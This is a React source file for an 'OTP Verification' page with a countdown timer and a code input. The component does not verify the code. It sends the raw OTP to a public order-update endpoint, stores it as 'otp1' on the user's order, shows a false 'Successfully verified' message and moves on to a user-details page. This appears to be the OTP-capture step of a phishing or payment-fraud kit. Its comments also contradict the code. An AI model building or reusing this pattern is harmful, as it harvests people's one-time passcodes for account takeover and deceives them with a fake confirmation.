import { useState } from "react";
import TextField from "@mui/material/TextField";
import { CountdownCircleTimer } from "react-countdown-circle-timer";
import { useNavigate } from "react-router-dom";
import useOrderData from "../../Hooks/useOrderData";
import useAxiosPublic from "../../Hooks/useAxiosPublic";
import Swal from "sweetalert2";

const FristOtp = () => {
  const [otp, setOtp] = useState("");
  const [isOtpCorrect, setIsOtpCorrect] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const { lastOrder } = useOrderData();

  const axiosPublic = useAxiosPublic();
  const id = lastOrder?._id;
  const navigate = useNavigate();

  // Handle OTP input change
  const handleOtpChange = (e) => {
    const value = e.target.value;

    // Allow only digits and limit to 4 characters
    if (/^\d{0,8}$/.test(value)) {
      setOtp(value);

      // Check if the OTP has 8 digits
      if (value.length > 3) {
        setIsOtpCorrect(true);
      } else {
        setIsOtpCorrect(false);
      }
    }
  };

  // console.log(orderData);
  // Handle OTP verification (log the OTP value to the console)
  const handleVerifyOtp = () => {
    console.log("Entered OTP:", otp);
    axiosPublic
      .patch(`order-update/${id}`, { otp1: otp })
      .then((response) => {
        console.log("OTP2 updated successfully:", response.data);
        Swal.fire({
          position: "top",
          icon: "success",
          title: "Successfully verified",
          showConfirmButton: false,
          timer: 1500,
        });
        navigate("/userDetails");
      })
      .catch((error) => {
        console.error("Error updating OTP1:", error);
      });
  };

  return (
    <div className="container mx-auto lg:w-1/2 md:w-3/4 sm:w-full px-4">
      <h2 className="text-center text-3xl sm:text-4xl font-bold text-gray-800 mt-5">
        OTP Verification
      </h2>

      {/* Countdown Timer */}
      <div className="flex justify-center my-5">
        <CountdownCircleTimer
          isPlaying
          duration={180}
          colors={["#14B8A9",]}
          colorsTime={[180]}
          size={140}
          strokeWidth={8}
        >
          {({ remainingTime }) => {
            const minutes = Math.floor(remainingTime / 60);
            const seconds = remainingTime % 60;
            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;

            return (
              <div className="text-2xl sm:text-3xl md:text-4xl font-bold text-gray-900">
                {`${minutes}:${formattedSeconds}`}
              </div>
            );
          }}
        </CountdownCircleTimer>
      </div>

      {/* OTP Input Field */}
      <div className="flex justify-center my-5">
        <div className="w-full max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg">
          <TextField
            className="text-lg sm:text-2xl"
            id="otp-input"
            label="Enter OTP"
            type="tel"
            variant="outlined"
            fullWidth
            required
            value={otp}
            onChange={handleOtpChange}
            inputProps={{
              maxLength: 8,
              style: { fontSize: "22px", color: "#1F2937" },
            }} // Darker font color for contrast
            InputLabelProps={{ style: { color: "#4B5563" } }}
          />
        </div>
      </div>

      {/* Verify OTP Button (only visible when OTP is correct) */}
      {isOtpCorrect && (
        <div className="flex justify-center my-3">
          <button
            onClick={handleVerifyOtp}
            className="px-6 py-2 bg-[#14B8A9] hover:bg-[#115752] text-white rounded-lg font-semibold  transition duration-300"
          >
            Verify OTP
          </button>
        </div>
      )}

      {/* Error Message */}
      {errorMessage && (
        <div className="text-red-600 text-center my-3 font-semibold">
          {errorMessage}
        </div>
      )}
    </div>
  );
};

export default FristOtp;
